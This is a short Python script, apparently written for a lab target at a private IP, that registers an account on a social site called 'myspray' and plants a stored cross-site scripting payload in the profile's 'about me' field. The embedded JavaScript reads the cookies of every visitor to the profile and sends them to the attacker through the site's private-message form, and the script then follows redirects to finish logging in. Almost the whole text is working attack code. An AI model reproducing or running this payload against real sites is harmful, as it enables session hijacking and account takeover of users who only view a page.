import requests
import re

s = requests.Session()

baseurl = 'http://10.0.23.22/myspray/'

#script to be injected into user profile
#this script steals cookies of everyone that checks the user's page
#it sends the cookie via private message to the user
script = '''
<script>
	var request = new XMLHttpRequest();
	request.open('POST', 'writemessage' + 
	document.getElementById('profileImage').src.split('/').slice(-2)[0]
	+ '.html', true);
	request.setRequestHeader('accept', 'application/json');

	var formData = new FormData();
	formData.append('subject', 'Hello, there is my cookies!');
	formData.append('message', document.cookie);

	request.send(formData);
</script>
'''
#form data for user registry
register_data = {
'first_name': 'Cookie', 
'last_name': 'Stealer',
'city': '',
'gender': '',
'birthdayYear': '',
'face': '',
'motivation': '',
'tag':'',
'skill':'',
'style':'',
'jabber':'',
'email': 'lost@cookies.com',
'website':'',
'job':'',
'interests':'',
'aboutme':'While you were reading, I got your cookies.' + script,
'password': '12345678',
'passwordRepeat': '12345678'
}

#request to register on myspray
response = s.post(baseurl + 'register.html', data = register_data)

#regex to look for meta redirects
regex = re.compile('<meta[^>]*?url=(.*?)["\']', re.IGNORECASE)

match = regex.search(response.text)

while match: #loop for redirecting until logged in
    response = s.get(baseurl + match.groups()[0].strip())
    match = regex.search(response.text)

print "User registered!"
print "email: lost@cookies.com"
print "passw: 12345678"
